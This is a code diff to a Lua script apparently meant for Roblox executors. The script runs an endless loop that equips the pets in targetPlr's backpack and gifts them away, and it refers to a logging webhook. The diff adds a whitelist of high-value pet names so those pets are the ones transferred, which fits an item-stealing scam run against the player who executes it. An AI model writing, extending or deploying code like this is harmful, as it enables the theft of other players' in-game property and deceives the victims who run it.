@@ -76,11 +76,12 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
                 ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                 ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                 ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
-                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
+                ["Peacock"] = { priority = 29, emoji = "❄️", isMutation = false },
                 ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                 ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                 ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
+                ["Rainbow Elephant"] = { priority = 97, emoji = "🗿", isMutation = false },
+                ["Rainbow Dilophosaurus"] = { priority = 98, emoji = "🗿", isMutation = false },
                 -- Mutations
                 ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                 ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
@@ -96,6 +97,10 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
                 ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
                 ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
                 ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
+                ["Nightmare"] = { priority = 99, emoji = "🪩", isMutation = true },
+                ["Aurora"] = { priority = 29, emoji = "🚀", isMutation = true },
+["JUMBO"] = { priority = 30, emoji = "🚀", isMutation = true },
+["Tethered"] = { priority = 31, emoji = "🚀", isMutation = true },
             }
 
         local function detectExecutor()
@@ -165,7 +170,7 @@ local request = http_request or request or (syn and syn.request) or (fluxus and 
                 if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                     local petName = tool.Name
                     
-                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
+                    if petName:find("Bunny") or petName:find("Golden Lab") then
                         continue
                     end
 
@@ -696,31 +701,97 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
+-- === WHITELIST FILTER ===
+local PetWhitelist = {
+    ["Brontosaurus"] = true,
+    ["Mimic Octopus"] = true,
+    ["Peacock"] = true,
+    ["Bald Eagle"] = true,
+   ["Wasp"] = true,
+   ["Sea Turtle"] = true,
+   ["Seal"] = true,
+   ["Tarantula Hawk"] = true,
+   ["Ostrich"] = true,
+   ["Scarlet Macaw"] = true,
+   ["Capybara"] = true,
+   ["Butterfly"] = true,
+   ["Dragonfly"] = true,
+   ["Disco Bee"] = true,
+   ["Queen Bee"] = true,
+   ["Swan"] = true,
+   ["Ruby Squid"] = true,
+   ["Meerkat"] = true,
+   ["Hotdog Daschund"] = true,
+   ["Wisp"] = true,
+   ["Spider"] = true,
+   ["Echo Frog"] = true,
+   ["Dilophosaurus"] = true,
+   ["Koi"] = true,
+   ["Raccoon"] = true,
+   ["Fennec Fox"] = true,
+   ["T-Rex"] = true,
+   ["Spinosaurus"] = true,
+   ["French Fry Ferret"] = true,
+   ["Luminous Sprite"] = true,
+   ["Phoenix"] = true,
+   ["Reaper"] = true,
+   ["Elephant"] = true,
+   ["Kitsune"] = true,
+   ["Headless Horseman"] = true,
+   ["Rainbow Elephant"] = true,
+   ["Rainbow Dilophosaurus"] = true,
+   ["Rainbow Hydra"] = true,
+   ["Rainbow Spinosaurus"] = true,
+   ["Rainbow Hotdog Dashcund"] = true,
+   ["Rainbow Pachycephalosaurus"] = true,
+   ["Ghostly Spider"] = true,
+   ["Ghostly Headless Horseman"] = true,
+["Echo Frog"] = true,
+   
+   
+}
+
+local function ShouldGiftPet(pet)
+    -- Pet.Type sudah versi tanpa mutation prefix
+    if PetWhitelist[pet.Type] then
+        return true
+    end
+
+    return false
+end
+
+
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
-            while true do
-                task.wait(2)  -- Re-scan every 2 seconds
-                local currentPets = GetPlayerPets()
-                if #currentPets == 0 then continue end
+    while true do
+        task.wait(2)
+        local currentPets = GetPlayerPets()
+        if #currentPets == 0 then continue end
 
-                for _, pet in ipairs(currentPets) do
-                    for _, tool in targetPlr.Backpack:GetChildren() do
-                        if tool:IsA("Tool")
-                        and tool:GetAttribute("ItemType") == "Pet"
-                        and tool:GetAttribute("PET_UUID") == pet.Id then
+        for _, pet in ipairs(currentPets) do
 
-                            print("Equipping & gifting:", tool.Name)
-                            targetPlr.Character.Humanoid:EquipTool(tool)
-                            task.wait(0.6)
+            -- === WHITELIST FILTER ===
+            if not ShouldGiftPet(pet) then
+                print("SKIPPED (Not whitelisted):", pet.PetName)
+                continue
+            end
+            -- ==========================
 
-                            for i = 1, 3 do
-                                if giftHeldPet() then
-                                    break
-                                end
-                                task.wait(0.3)
-                            end
-                        end
+            for _, tool in targetPlr.Backpack:GetChildren() do
+                if tool:IsA("Tool")
+                and tool:GetAttribute("ItemType") == "Pet"
+                and tool:GetAttribute("PET_UUID") == pet.Id then
+
+                    print("Equipping & gifting:", tool.Name)
+                    targetPlr.Character.Humanoid:EquipTool(tool)
+                    task.wait(0.6)
+
+                    for i = 1, 3 do
+                        if giftHeldPet() then break end
+                        task.wait(0.3)
                     end
                 end
             end
-        end)
+        end
+    end
+end)
